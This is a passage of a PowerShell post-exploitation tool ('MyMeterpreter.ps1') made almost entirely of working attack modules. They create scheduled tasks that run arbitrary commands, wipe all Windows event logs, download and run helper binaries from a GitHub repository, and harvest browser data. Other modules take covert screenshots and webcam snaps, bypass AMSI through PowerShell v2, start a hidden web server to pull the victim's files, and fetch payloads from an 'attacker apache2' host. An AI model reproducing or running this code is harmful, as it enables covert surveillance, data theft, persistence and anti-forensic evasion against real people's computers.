      Get-Process -EA SilentlyContinue|Select-Object Id,Name,Path,Company,FileVersion,mainwindowtitle,StartTime,Responding|Where-Object { $_.Responding -Match "True" -and $_.StartTime -ne $null}
   }ElseIf($GetProcess -ieq "Enum" -and $ProcessName -ne "false"){## Enumerate User Inpur ProcessName
      $RawProcName = $ProcessName -replace '.exe','' ## Replace .exe in processname to be abble use Get-Process
      Write-Host "$Remote_hostName $ProcessName Process" -ForegroundColor Green
      Write-Host "---------------------------";Start-Sleep -Seconds 1

      $CheckProc = Get-Process $RawProcName -EA SilentlyContinue|Select-Object Id,Name,Description,mainwindowtitle,ProductVersion,Path,Company,StartTime,HasExited,Responding
      If(-not($CheckProc)){## User Input => ProcessName NOT found
         Write-Host "[error] $ProcessName NOT found running!" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1
      }Else{## User Input => ProcessName found report
         echo $CheckProc > $Env:TMP\CheckProc.log
         Get-Content -Path $Env:TMP\CheckProc.log
         Remove-Item -Path $Env:TMP\CheckProc.log -Force
      }

   }ElseIf($GetProcess -ieq "Kill"){## Kill User Input => Running Process
      If($ProcessName -ieq $null -or $ProcessName -ieq "false"){## Make sure ProcessName Mandatory argument its set
        Write-Host "[error] -ProcessName Mandatory Parameter Required!" -ForegroundColor Red -BackgroundColor Black
        Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
      }

      ## Make sure ProcessName its running
      $RawProcName = $ProcessName -replace '.exe',''
      $MSPIR = (Get-Process $RawProcName -EA SilentlyContinue).Responding|Select-Object -First 1
      If($MSPIR -ieq "True"){## ProcessName found => Responding
         If(-not($ProcessName -Match "[.exe]$")){## Add extension required (.exe) by taskkill cmdline
            $ProcessName = "$ProcessName" + ".exe" -join ''
         }
         cmd /R taskkill /F /IM $ProcessName
      }Else{## ProcessName NOT found responding
         Write-Host "[error] $ProcessName Process Name NOT found!" -ForegroundColor Red -BackgroundColor Black
         Start-Sleep -Seconds 1
      }
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"){

   <#
   .SYNOPSIS
     Helper - Enumerate\Create\Delete running tasks

   .DESCRIPTION
      This module enumerates remote host running tasks
      Or creates a new task Or deletes existence tasks

   .NOTES
      Required Dependencies: cmd|schtasks {native}
      Remark: Module parameters are auto-set {default}
      Remark: Tasks have the default duration of 9 hours.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Enum

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Create
      Use module default settings to create the demo task

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Delete -TaskName mytask
      Deletes mytask taskname

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"

   .OUTPUTS
      TaskName                                 Next Run Time          Status
      --------                                 -------------          ------
      ASUS Smart Gesture Launcher              N/A                    Ready          
      CreateExplorerShellUnelevatedTask        N/A                    Ready          
      OneDrive Standalone Update Task-S-1-5-21 24/01/2021 17:43:44    Ready   
   #>

   ## Select the type of module to run
   If($GetTasks -ieq "Enum"){## Enum All running tasks

      Write-Host "$Remote_hostName\$Env:USERNAME Running Tasks" -ForegroundColor Green
      Write-Host "--------------------------`n"
      Start-Sleep -Seconds 1
      Write-Host "TaskName                                 Next Run Time          Status"
      Write-Host "--------                                 -------------          ------"
      cmd.exe /R schtasks|findstr /I "Ready Running"
      Write-Host "";Start-Sleep -Seconds 1

   }ElseIf($GetTasks -ieq "Create"){## Create a new tak

      If($Exec -ieq "false" -or $Exec -ieq $null){
         $Exec = "cmd /c start calc.exe" ## Default Command to Execute
      }

      $Task_duration = "000" + "9" + ":00" ## 9 Hours of Task Duration
      cmd /R schtasks /Create /sc minute /mo "$Interval" /tn "$TaskName" /tr "$Exec" /du "$Task_duration"
      Write-Host "";schtasks /Query /tn "$TaskName" #/v /fo list

   }ElseIf($GetTasks -ieq "Delete"){## Deletes existing task

      cmd /R schtasks /Delete /tn "$TaskName" /f

   }
   Write-Host "`n"
   If(Test-Path -Path "$Env:TMP\schedule.txt"){Remove-Item -Path "$Env:TMP\schedule.txt" -Force}
}

If($GetLogs -ieq "Enum" -or $GetLogs -ieq "Clear" -or $GetLogs -ieq "Verbose"){
If($NewEst -lt "5" -or $NewEst -gt "80"){$NewEst = "10"} ## Set the max\min logs to display

   <#
   .SYNOPSIS
      Helper - Enumerate eventvwr logs OR Clear All event logs

   .NOTES
      Required Dependencies: wevtutil {native}
      The Clear @argument requires Administrator privs
      on shell to be abble to 'Clear' Eventvwr entrys.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Enum
      Lists ALL eventvwr categorie entrys

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Verbose
      List the newest 10(default) Powershell\Application\System entrys

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Verbose -NewEst 28
      List the newest 28 Eventvwr Powershell\Application\System entrys

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Clear
      Remark: Clear @arg requires Administrator privs on shell

   .OUTPUTS
      Max(K) Retain OverflowAction    Entries Log                   
      ------ ------ --------------    ------- ---                            
      20 480      0 OverwriteAsNeeded   1 024 Application           
      20 480      0 OverwriteAsNeeded       0 HardwareEvents                 
      20 480      0 OverwriteAsNeeded      74 System                
      15 360      0 OverwriteAsNeeded      85 Windows PowerShell
   #>

   If($GetLogs -ieq "Enum" -or $GetLogs -ieq "Verbose"){## Eventvwr Enumeration
      ## List ALL Event Logs
      Get-EventLog -List|Format-Table -AutoSize

      If($GetLogs -ieq "Verbose"){## verbose @argument function

         ## Local function Variable declarations {Powershell}
         $SysLogCatg = wevtutil gl "Windows Powershell"|findstr /I /C:"name"
         $SysLogCatg = $SysLogCatg|findstr /V "logFileName:"
         $SysLogType = wevtutil gl "Windows Powershell"|findstr /I "type"
         $SysLogStat = wevtutil gl "Windows Powershell"|findstr /I "enabled"
         $SysLogFile = wevtutil gl "Windows Powershell"|findstr /I "logFileName"
         $SysLogFile = $SysLogFile -replace '(^\s+|\s+$)','' ## Delete Empty spaces in beggining and End of string

         ## List last 10 Powershell eventlogs
         Write-Host "`n  $SysLogCatg" -ForegroundColor Green
         Write-Host "  $SysLogType" -ForegroundColor Yellow
         Write-Host "  $SysLogStat" -ForegroundColor Yellow
         $Log = Get-EventLog -LogName "Windows Powershell" -newest $NewEst -EA SilentlyContinue|Select-Object EntryType
         If($? -ieq $False){## $LASTEXITCODE return $False => None Logs present
            Write-Host "  $SysLogFile" -ForegroundColor Yellow
            Write-Host "  [error] None Eventvwr Entries found under Windows Powershell!`n" -ForegroundColor Red -BackgroundColor Black
         }Else{## $LASTEXITCODE return $True => Logs present
            Write-Host "  $SysLogFile`n" -ForegroundColor Yellow
            Get-EventLog -LogName "Windows Powershell" -newest $NewEst -EA SilentlyContinue|Select-Object EntryType,Source,Message|Format-Table -AutoSize
         }


         ## Local function Variable declarations {Application}
         $SysLogCatg = wevtutil gl "Application"|findstr /I /C:"name"
         $SysLogCatg = $SysLogCatg|findstr /V "logFileName:"
         $SysLogType = wevtutil gl "Application"|findstr /I "type"
         $SysLogStat = wevtutil gl "Application"|findstr /I "enabled"
         $SysLogFile = wevtutil gl "Application"|findstr /I "logFileName"
         $SysLogFile = $SysLogFile -replace '(^\s+|\s+$)','' ## Delete Empty spaces in beggining and End of string

         ## List last 10 Application eventlogs
         Write-Host "`n  $SysLogCatg" -ForegroundColor Green
         Write-Host "  $SysLogType" -ForegroundColor Yellow
         Write-Host "  $SysLogStat" -ForegroundColor Yellow
         $Log = Get-EventLog -LogName "Application" -newest $NewEst -EA SilentlyContinue|Select-Object EntryType
         If($? -ieq $False){## $LASTEXITCODE return $False => None Logs present
            Write-Host "  $SysLogFile" -ForegroundColor Yellow
            Write-Host "  [error] None Eventvwr Entries found under Application!`n" -ForegroundColor Red -BackgroundColor Black
         }Else{## $LASTEXITCODE return $True => Logs present
            Write-Host "  $SysLogFile`n" -ForegroundColor Yellow
            Get-EventLog -LogName "Application" -newest $NewEst -EA SilentlyContinue|Select-Object EntryType,Source,Message|Format-Table -AutoSize
         }


         ## Local function Variable declarations {System}
         $SysLogCatg = wevtutil gl System|findstr /I /C:"name"
         $SysLogCatg = $SysLogCatg|findstr /V "logFileName:"
         $SysLogType = wevtutil gl System|findstr /I "type"
         $SysLogStat = wevtutil gl System|findstr /I "enabled"
         $SysLogFile = wevtutil gl System|findstr /I "logFileName"
         $SysLogFile = $SysLogFile -replace '(^\s+|\s+$)','' ## Delete Empty spaces in beggining and End of string

         ## List last 10 System eventlogs
         Write-Host "`n  $SysLogCatg" -ForegroundColor Green
         Write-Host "  $SysLogType" -ForegroundColor Yellow
         Write-Host "  $SysLogStat" -ForegroundColor Yellow
         $Log = Get-EventLog -LogName "System" -newest $NewEst -EA SilentlyContinue|Select-Object EntryType
         If($? -ieq $False){## $LASTEXITCODE return $False => None Logs present
            Write-Host "  $SysLogFile" -ForegroundColor Yellow
            Write-Host "  [error] None Eventvwr Entries found under System!`n" -ForegroundColor Red -BackgroundColor Black
         }Else{## $LASTEXITCODE return $True => Logs present
            Write-Host "  $SysLogFile`n" -ForegroundColor Yellow
            Get-EventLog -LogName "System" -newest $NewEst -EA SilentlyContinue|Select-Object EntryType,Source,Message|Format-Table -AutoSize
         }
      }

   }ElseIf($GetLogs -ieq "Clear"){## Clear ALL Eventvwr Logs
      $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
      If(-not($IsClientAdmin)){## wevtutil cl => requires Administrator rigths to run
         Write-Host "[error] This module requires 'Administrator' rigths to run!" -ForegroundColor Red -BackgroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
      }
      ## Clear ALL event Logs
      Write-Host "[i] Administrator Privileges: True" -ForegroundColor Yellow
      Write-Host "[+] Cleaning $Remote_hostName\$Env:USERNAME Eventvwr logs ...`n" -ForeGroundColor Green
      wevtutil el|Foreach-Object {wevtutil cl "$_"}
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose"){

   <#
   .SYNOPSIS
      Helper - Leak Installed Browsers Information

   .NOTES
      This module downloads GetBrowsers.ps1 from venom
      GitHub repository into remote host %TMP% directory,
      And identify install browsers and run enum modules.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetBrowsers Enum
      Identify installed browsers and versions

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetBrowsers Verbose
      Run enumeration modules againts ALL installed browsers

   .OUTPUTS
      Browser   Install   Status   Version         PreDefined
      -------   -------   ------   -------         ----------
      IE        Found     Stoped   9.11.18362.0    False
      CHROME    False     Stoped   {null}          False
      FIREFOX   Found     Active   81.0.2          True
   #>

   If(-not(Test-Path -Path "$Env:TMP\GetBrowsers.ps1")){## Download GetBrowsers.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/meterpeter/mimiRatz/GetBrowsers.ps1 -Destination $Env:TMP\GetBrowsers.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetBrowsers.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 58){## Corrupted download detected => DefaultFileSize: 58,1474609375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetBrowsers.ps1"){Remove-Item -Path "$Env:TMP\GetBrowsers.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @MyMeterpreter
      }   
   }

   ## Detect ALL Available browsers Installed { IE, FIREFOX, CHROME }
   $IEVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -EA SilentlyContinue).version
   If($IEVersion){$IEfound = "Installed"}else{$IEfound = "NotFound"}
   $Chrome_App = (Get-ItemProperty "HKCU:\Software\Google\Chrome\BLBeacon" -EA SilentlyContinue).version
   If($Chrome_App){$CHfound = "Installed"}else{$CHfound = "NotFound"}
   $FFfound = (Get-Process firefox -ErrorAction SilentlyContinue)
   If($FFfound){$FFfound = "Installed"}else{$FFfound = "NotFound"}

   ## Run sellect modules againts installed browsers
   If($GetBrowsers -ieq "Enum"){## [ Enum ] @arg scans
      &"$Env:TMP\GetBrowsers.ps1" -RECON
   }Else{## [ Verbose ] @arg scans

      &"$Env:TMP\GetBrowsers.ps1" -RECON
      If($IEfound -ieq "Installed"){## IExplorer Found
         &"$Env:TMP\GetBrowsers.ps1" -IE
      }

      If($CHfound -ieq "Installed"){## Chrome Found
         &"$Env:TMP\GetBrowsers.ps1" -CHROME
      }

      If($FFfound -ieq "Installed"){## Firefox Found
         If(-not(Test-Path "$Env:TMP\mozlz4-win32.exe")){## Downloads binary auxiliary 
            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/meterpeter/mimiRatz/mozlz4-win32.exe -Destination $Env:TMP\mozlz4-win32.exe -ErrorAction SilentlyContinue|Out-Null
            ## Check downloaded file integrity => FileSizeKBytes
            $SizeDump = ((Get-Item -Path "$Env:TMP\mozlz4-win32.exe" -EA SilentlyContinue).length/1KB)
            If($SizeDump -lt 669){## Corrupted download detected => DefaultFileSize: 669,5/KB
               Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
               If(Test-Path -Path "$Env:TMP\mozlz4-win32.exe"){Remove-Item -Path "$Env:TMP\mozlz4-win32.exe" -Force}
            }
         }
         ## Execute GetBrowsers -FIREFOX parameter
         &"$Env:TMP\GetBrowsers.ps1" -FIREFOX
      }
   }
   ## Clean Old Files
   If(Test-Path -Path "$Env:TMP\mozlz4-win32.exe"){Remove-Item -Path "$Env:TMP\mozlz4-win32.exe" -Force}
   If(Test-Path -Path "$Env:TMP\GetBrowsers.ps1"){Remove-Item -Path "$Env:TMP\GetBrowsers.ps1" -Force}
   Start-Sleep -Seconds 1
}

If($Screenshot -gt 0){
$Limmit = $Screenshot+1 ## The number of screenshots to be taken
If($Delay -lt '1' -or $Delay -gt '180'){$Delay = '1'} ## Screenshots delay time max\min value accepted

   <#
   .SYNOPSIS
      Helper - Capture remote desktop screenshot(s)

   .DESCRIPTION
      This module can be used to take only one screenshot
      or to spy target user activity using -Delay parameter.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Screenshot 1
      Capture 1 desktop screenshot and store it on %TMP%.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Screenshot 5 -Delay 8
      Capture 5 desktop screenshots with 8 secs delay between captures.

   .OUTPUTS
      ScreenCaptures Delay  Storage                          
      -------------- -----  -------                          
      1              1(sec) C:\Users\pedro\AppData\Local\Temp
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\MyMeterpreter.ps1 -Screenshot 1"
   Write-Host "Example: .\MyMeterpreter.ps1 -Screenshot 3 -Delay 10`n"
   Start-Sleep -Seconds 1

   ## Create Data Table for output
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("ScreenCaptures")|Out-Null
   $mytable.Columns.Add("Delay")|Out-Null
   $mytable.Columns.Add("Storage")|Out-Null
   $mytable.Rows.Add("$Screenshot",
                     "$Delay(sec)",
                     "$Env:TMP")|Out-Null

   ## Display Data Table
   $mytable|Format-Table -AutoSize > $Env:TMP\MyTable.log
   Get-Content -Path "$Env:TMP\MyTable.log"
   Remove-Item -Path "$Env:TMP\MyTable.log" -Force


   ## Loop Function to take more than one screenshot.
   For($num = 1 ; $num -le $Screenshot ; $num++){

      $OutPutPath = "$Env:TMP"
      $Dep = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 5 |%{[char]$_})
      $FileName = "$Env:TMP\Capture-"+"$Dep.png"
      If(-not(Test-Path "$OutPutPath")){New-Item $OutPutPath -ItemType Directory -Force}
      Add-Type -AssemblyName System.Windows.Forms
      Add-type -AssemblyName System.Drawing
      $ASLR = [System.Windows.Forms.SystemInformation]::VirtualScreen
      $Height = $ASLR.Height;$Width = $ASLR.Width
      $Top = $ASLR.Top;$Left = $ASLR.Left
      $Console = New-Object System.Drawing.Bitmap $Width, $Height
      $AMD = [System.Drawing.Graphics]::FromImage($Console)
      $AMD.CopyFromScreen($Left, $Top, 0, 0, $Console.Size)
      $Console.Save($FileName) 

      Write-Host "$num - Saved: $FileName" -ForegroundColor Yellow
      Start-Sleep -Seconds $Delay; ## 2 seconds delay between screenshots (default value)
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($Camera -ieq "Enum" -or $Camera -ieq "Snap"){

   <#
   .SYNOPSIS
      Helper - List computer cameras or capture camera screenshot

   .NOTES
      Remark: WebCam turns the ligth ON taking snapshots.
      Using -Camera Snap @argument migth trigger AV detection
      Unless target system has powershell version 2 available.
      In that case them PS version 2 will be used to execute
      our binary file and bypass AV amsi detection.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Camera Enum
      List ALL WebCams Device Names available

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Camera Snap
      Take one screenshot using default camera

   .OUTPUTS
      StartTime ProcessName DeviceName           
      --------- ----------- ----------           
      17:32:23  CommandCam  USB2.0 VGA UVC WebCam
   #>

   ## Download CommandCam binary if not exist
   If(-not(Test-Path -Path "$Env:TMP\CommandCam.exe")){## Download CommandCam.exe from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/meterpeter/mimiRatz/CommandCam.exe -Destination $Env:TMP\CommandCam.exe -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\CommandCam.exe" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 132){## Corrupted download detected => DefaultFileSize: 132/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\CommandCam.exe"){Remove-Item -Path "$Env:TMP\CommandCam.exe" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @MyMeterpreter
      }   
   }


   If($Camera -ieq "Enum"){## Enumerate All WebCam devices

      ## AMSI Bypass execution function
      $CheckBypass = powershell -version 2 -C Get-Host -EA SilentlyContinue
      If($CheckBypass -Match '2.0'){## PS version 2 found
         $SnapTimer = Get-Date -Format 'HH:mm:ss';cd $Env:TMP
         Write-Host "[i] PS version 2 execution (amsi bypass)" -ForegroundColor Yellow
         powershell -version 2 .\CommandCam.exe /devlist > $Env:TMP\CC.log
         cd $Working_Directory ## Return to @MyMeterpreter Working Directory
      }Else{## Remote Host without PS v2 available
         cd $Env:TMP
         $SnapTimer = Get-Date -Format 'HH:mm:ss'
         .\CommandCam.exe /devlist > $Env:TMP\CC.log
         cd $Working_Directory ## Return to @MyMeterpreter Working Directory
      }

      ## Parsing Camera Data
      If(Test-Path -Path "$Env:TMP\CC.log"){## Check for logfile existence
         $ParseData = Get-Content -Path "$Env:TMP\CC.log"|findstr /C:"Device name:"
         $StripPoints = $ParseData -split(":") ## Split report into two arrays
         ## Replace empty spaces in 'Beggining' and 'End' of string
         $DeviceCapture = $StripPoints[1] -replace '(^\s+|\s+$)',''
         Remove-Item -Path "$Env:TMP\CC.log" -Force
      }Else{## Error CC.log NOT found
         $DeviceCapture = "Fail to retrieve Device Name!"
      }

      ## Create Data Table for output
      $mytable = New-Object System.Data.DataTable
      $mytable.Columns.Add("StartTime")|Out-Null
      $mytable.Columns.Add("ProcessName")|Out-Null
      $mytable.Columns.Add("DeviceName")|Out-Null
      $mytable.Rows.Add("$SnapTimer",
                        "CommandCam",
                        "$DeviceCapture")|Out-Null

      ## Display Data Table
      $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
      Get-Content -Path "$Env:TMP\KeyDump.log"
      Remove-Item -Path "$Env:TMP\KeyDump.log" -Force

   }ElseIf($Camera -ieq "Snap"){## Take SnapShot with default Camera

      ## AMSI Bypass execution function
      $CheckBypass = powershell -version 2 -C Get-Host -EA SilentlyContinue
      If($CheckBypass -Match '2.0'){## PS version 2 found
         $SnapTimer = Get-Date -Format 'HH:mm:ss';cd $Env:TMP
         Write-Host "[i] PS version 2 execution (amsi bypass)" -ForegroundColor Yellow
         powershell -version 2 .\CommandCam.exe /quiet
         cd $Working_Directory ## Return to @MyMeterpreter Working Directory
      }Else{## Remote Host without PS v2 available
         cd $Env:TMP
         .\CommandCam.exe /quiet
         $SnapTimer = Get-Date -Format 'HH:mm:ss'
         cd $Working_Directory ## Return to @MyMeterpreter Working Directory
      }

      ## Make sure image.bmp exist
      If(Test-Path -Path "$Env:TMP\image.bmp"){
         $Cap = "$Env:TMP\image.bmp"
      }Else{## Image.bmp NOT found
         $Cap = "Fail to take screenshot!"
      }

      ## Create Data Table for output
      $mytable = New-Object System.Data.DataTable
      $mytable.Columns.Add("StartTime")|Out-Null
      $mytable.Columns.Add("ProcessName")|Out-Null
      $mytable.Columns.Add("Capture")|Out-Null
      $mytable.Rows.Add("$SnapTimer",
                        "CommandCam",
                        "$Cap")|Out-Null

      ## Display Data Table
      $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
      Get-Content -Path "$Env:TMP\KeyDump.log"
      Remove-Item -Path "$Env:TMP\KeyDump.log" -Force
   }

   ## Clean OLd files
   If(Test-Path -Path "$Env:TMP\CommandCam.exe"){
      Remove-Item -Path "$Env:TMP\CommandCam.exe" -Force
   }
   If(Test-Path -Path "$Env:TMP\test.log"){
      Remove-Item -Path "$Env:TMP\test.log" -Force
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){

   <#
   .SYNOPSIS
      Helper - Start Local HTTP WebServer (Background)

   .NOTES
      Access WebServer: http://<RHOST>:8080/
      This module download's webserver.ps1 or Start-WebServer.ps1
      to remote host %TMP% and executes it on an hidden terminal prompt
      to allow users to silent browse/read/download files from remote host.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Python
      Downloads webserver.ps1 to %TMP% and executes the webserver.
      Remark: This Module uses Social Enginnering to trick remote host into
      installing python (python http.server) if remote host does not have it.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Python -SPort 8087
      Downloads webserver.ps1 and executes the webserver on port 8087

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Powershell
      Downloads Start-WebServer.ps1 and executes the webserver.
      Remark: Admin privileges are requiered in shell to run the WebServer

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Powershell -SPort 8087
      Downloads Start-WebServer.ps1 and executes the webserver on port 8087
      Remark: Admin privileges are requiered in shell to run the WebServer
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\MyMeterpreter.ps1 -StartWebServer Python"
   Write-Host "Example: .\MyMeterpreter.ps1 -StartWebServer Powershell"
   Write-Host "Example: .\MyMeterpreter.ps1 -StartWebServer Python -SPort 8087"
   Write-Host "Example: .\MyMeterpreter.ps1 -StartWebServer Powershell -SPort 8087`n"
   Start-Sleep -Seconds 2

   ## Chose what WebServer to use (Python|Powershell)
   If($StartWebServer -ieq "Python"){## Python http.server sellected as webserver
      If(-not(Test-Path -Path "$Env:TMP\webserver.ps1")){## Make sure auxiliary module exists on remote host
         Write-Host "[+] Task      : Downloading webserver.ps1 from github" -ForegroundColor Green
         Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/aux/webserver.ps1 -Destination $Env:TMP\webserver.ps1 -ErrorAction SilentlyContinue|Out-Null   
      }

      ## Check downloaded file integrity
      $SizeDump = ((Get-Item -Path "$Env:TMP\webserver.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 44){## Corrupted download detected => DefaultFileSize: 44,685546875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\webserver.ps1"){Remove-Item -Path "$Env:TMP\webserver.ps1" -Force}
      }Else{
         ## Force the install of python 2 times if NOT installed on remote host
         Write-Host "[i] StopServer: Powershell -File `$Env:TMP\webserver.ps1 -SKill 1" -ForegroundColor Yellow
         powershell -File "$Env:TMP\webserver.ps1" -SForce 1 -SBind $Address -Sport $SPort
      }

   }ElseIf($StartWebServer -ieq "Powershell"){## Powershell sellected as webserver
      $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
      If($IsClientAdmin){## Start-WebServer requires Administrator rigths to run
         If(-not(Test-Path -Path "$Env:TMP\Start-WebServer.ps1")){## Make sure auxiliary module exists on remote host
            Write-Host "[+] Task      : Downloading Start-WebServer.ps1 from github" -ForegroundColor Green
            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/aux/Start-Webserver.ps1 -Destination $Env:TMP\Start-WebServer.ps1 -ErrorAction SilentlyContinue|Out-Null
         }

         ## Check downloaded file integrity
         $SizeDump = ((Get-Item -Path "$Env:TMP\Start-WebServer.ps1" -EA SilentlyContinue).length/1KB)
         If($SizeDump -lt 24){## Corrupted download detected => DefaultFileSize: 24,7763671875/KB
            Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
            If(Test-Path -Path "$Env:TMP\Start-WebServer.ps1"){Remove-Item -Path "$Env:TMP\Start-WebServer.ps1" -Force}
         }Else{
            powershell -File $Env:TMP\Start-WebServer.ps1 "http://${Address}:$Sport/"
         }

      }Else{## ERROR: Shell running under UserLand Privileges
         Write-Host "[error] Abort, Administrator privileges required on shell" -ForegroundColor Red -BackgroundColor Black
      }
   }
   Write-Host "";Start-Sleep -Seconds 1
}

If($Upload -ne "false"){

   <#
   .SYNOPSIS
      Helper - Download Files from Attacker Apache2 (BitsTransfer)

   .NOTES
      Required Dependencies: BitsTransfer {native}
      File to Download must be stored in attacker apache2 webroot.
      -Upload and -ApacheAddr Are Mandatory parameters (required).
      -Destination parameter its auto set to $Env:TMP by default.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination $Env:TMP\FileName.ps1
      Downloads FileName.ps1 script from attacker apache2 (192.168.1.73) into $Env:TMP\FileName.ps1 Local directory
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "syntax : .\MyMeterpreter.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker ] -Destination [ full\Path\file.ps1 ]"
   Write-Host "Example: .\MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\FileName.ps1`n"
   Start-Sleep -Seconds 2

   ## Make sure we have all parameters required
   If($ApacheAddr -ieq "false" -or $ApacheAddr -ieq $null){## Mandatory parameter
      Write-Host "[error]: -ApacheAddr Mandatory Parameter Required!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
   }
   If($Destination -ieq "false" -or $Destination -ieq $null){## [ -Destination ] parameter $null
      $Destination = "$Env:TMP\$Upload" ## NOT Mandatory parameter => Default: $Env:TMP
   }

   Write-Host "[+] Uploading $Upload to $Destination" -ForeGroundColor Green;Start-Sleep -Seconds 1
   If($ApacheAddr -Match '127.0.0.1'){## Localhost connections are NOT supported by this module
      Write-Host "[abort] 127.0.0.1 (localhost) connections are not supported!" -ForeGroundColor Red -BackGroundColor Black
      Write-Host "";Start-Sleep -Seconds 1;exit ## exit @MyMeterpreter
   }

   ## Download file using BitsTransfer
   Write-Host "[i] Trying to Download $Upload from $ApacheAddr Using BitsTransfer (BITS)" -ForeGroundColor Yellow      
   Start-BitsTransfer -priority foreground -Source http://$ApacheAddr/$Upload -Destination $Destination -ErrorAction SilentlyContinue|Out-Null   
   If(-not($LASTEXITCODE -eq 0)){Write-Host "[fail] to download $Upload using BitsTransfer service!" -ForeGroundColor Red -BackgroundColor Black;Start-Sleep -Seconds 1}

   ## Make sure that file was successfuly downloaded
   If(-not([System.IO.File]::Exists("$Destination")) -or $Upload -ieq $Null -or $Destination -ieq $null){
      Write-Host "`n[error]: BitsTransfer: Something went wrong with the download process!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 1;exit ## exit @MyMeterpreter  
   }

   ## Check for downloaded file (script) integrity
   If(-not($Upload -iMatch '[.exe]$')){## This test does not work on binary files (.exe)
      $Status = Get-Content -Path "$Destination" -EA SilentlyContinue
      If($Status -iMatch '^(<!DOCTYPE html)'){
         Write-Host "[abort] $Upload Download Corrupted (DOCTYPE html)" -ForeGroundColor Red -BackGroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
      }ElseIf($Status -iMatch '^(404)'){
         Write-Host "[abort] $Upload Not found in Remote Server (404)" -ForeGroundColor Red -BackGroundColor Black
         Write-Host "";Start-Sleep -Seconds 1;exit ## exit @webserver
      }ElseIf($Status -ieq $Null){
